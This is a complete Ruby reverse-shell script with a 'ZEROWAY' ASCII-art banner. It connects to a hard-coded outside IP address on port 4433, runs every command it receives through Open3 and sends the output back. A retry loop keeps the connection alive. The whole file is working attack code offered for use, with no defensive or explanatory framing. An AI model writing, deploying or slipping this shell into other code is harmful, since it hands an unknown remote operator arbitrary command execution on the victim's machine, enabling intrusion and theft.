#!/usr/bin/env ruby

str = <<END
███████╗███████╗██████╗  ██████╗ ██╗    ██╗ █████╗ ██╗   ██╗
╚══███╔╝██╔════╝██╔══██╗██╔═══██╗██║    ██║██╔══██╗╚██╗ ██╔╝
  ███╔╝ █████╗  ██████╔╝██║   ██║██║ █╗ ██║███████║ ╚████╔╝
 ███╔╝  ██╔══╝  ██╔══██╗██║   ██║██║███╗██║██╔══██║  ╚██╔╝
███████╗███████╗██║  ██║╚██████╔╝╚███╔███╔╝██║  ██║   ██║
╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝
[#]~Ruby Reverse Shell [Check listing terminal] CTRL+C to exit
END
puts str

require 'socket'
require 'open3'

IP = "81.171.24.35" 
PORT = "4433"

begin 
r3m0t3nu11 = TCPSocket.new "#{IP}", "#{PORT}"
r3m0t3nu11.puts "
███████╗███████╗██████╗  ██████╗ ██╗    ██╗ █████╗ ██╗   ██╗
╚══███╔╝██╔════╝██╔══██╗██╔═══██╗██║    ██║██╔══██╗╚██╗ ██╔╝
  ███╔╝ █████╗  ██████╔╝██║   ██║██║ █╗ ██║███████║ ╚████╔╝
 ███╔╝  ██╔══╝  ██╔══██╗██║   ██║██║███╗██║██╔══██║  ╚██╔╝
███████╗███████╗██║  ██║╚██████╔╝╚███╔███╔╝██║  ██║   ██║
╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝
Shelled Success! Type Command[#]\n\r
"
end
  
  begin 
  while line = r3m0t3nu11.gets
    Open3.popen3("sleep 3;#{line}") do | stdin, stdout_and_stderr |
              IO.copy_stream(stdout_and_stderr, r3m0t3nu11)
              end  
  end
rescue
  retry
end 
